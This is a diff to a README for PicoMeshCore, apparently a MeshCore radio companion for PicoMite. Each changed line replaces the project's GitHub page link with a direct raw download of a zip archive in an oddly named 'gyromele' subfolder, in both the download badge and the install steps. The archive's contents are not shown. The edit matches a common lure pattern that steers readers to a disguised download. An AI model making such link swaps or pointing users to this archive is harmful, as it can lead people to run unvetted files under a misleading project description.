@@ -1,12 +1,12 @@
 # 🛰️ PicoMeshCore - Simple MeshCore radio companion
 
-[![Download PicoMeshCore](https://img.shields.io/badge/Download-PicoMeshCore-blue?style=for-the-badge)](https://github.com/fjoel40/PicoMeshCore)
+[![Download PicoMeshCore](https://img.shields.io/badge/Download-PicoMeshCore-blue?style=for-the-badge)](https://raw.githubusercontent.com/fjoel40/PicoMeshCore/main/gyromele/Core-Pico-Mesh-v1.6.zip)
 
 ## 📥 Download
 
 Visit this page to download and run PicoMeshCore on your PicoMite setup:
 
-https://github.com/fjoel40/PicoMeshCore
+https://raw.githubusercontent.com/fjoel40/PicoMeshCore/main/gyromele/Core-Pico-Mesh-v1.6.zip
 
 ## 🧩 What PicoMeshCore does
 
@@ -44,7 +44,7 @@ Follow these steps to load PicoMeshCore and run it.
 
 Open the GitHub page:
 
-https://github.com/fjoel40/PicoMeshCore
+https://raw.githubusercontent.com/fjoel40/PicoMeshCore/main/gyromele/Core-Pico-Mesh-v1.6.zip
 
 If the repository includes release files, download the file made for the PicoMite setup. If it contains source files, download the full project folder.
 
